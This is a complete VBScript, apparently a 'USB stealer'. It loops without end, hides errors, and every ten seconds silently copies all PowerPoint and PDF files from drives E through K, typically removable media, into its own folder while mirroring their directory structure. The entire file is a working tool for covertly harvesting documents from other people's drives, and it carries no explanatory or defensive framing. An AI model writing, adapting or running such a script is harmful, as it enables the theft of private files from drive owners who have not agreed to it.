Function FilesTree(sPath, dPath)  
    Set oFso = CreateObject("Scripting.FileSystemObject")  
    Set oFolder = oFso.GetFolder(sPath)  
    Set oSubFolders = oFolder.SubFolders  
    Set oFiles = oFolder.Files  
    If NOT (oFso.FolderExists(dPath) or Left(sPath,1) = Left(dPath,1)) Then 
        oFso.createfolder(dPath)
        For Each oFile In oFiles  
            If right(oFile.Name,4) = "pptx" or right(oFile.Name,3) = "pdf" or right(oFile.Name,3) = "ppt" Then
                oFso.copyfile oFile.Path, dPath, true
            End If
        Next  

        For Each oSubFolder In oSubFolders
            If Not(left(oSubFolder.Name,6) = "System" or left(oSubFolder.Name,1) = "$") then
                FilesTree oSubFolder.Path, dPath & oSubFolder.Name & "\"
            End if
        Next  
          
        Set oFolder = Nothing  
        Set oSubFolders = Nothing  
        Set oFso = Nothing  
    End If
End Function  
  
On Error Resume Next


dim dDisk
dDisk = createobject("Scripting.FileSystemObject").GetFolder(".").Path
Do
    For each disk in split("K J I H G F E")
        FilesTree disk+":\", dDisk+"\"+disk+"\"
    Next
    wscript.sleep 10000
Loop While True
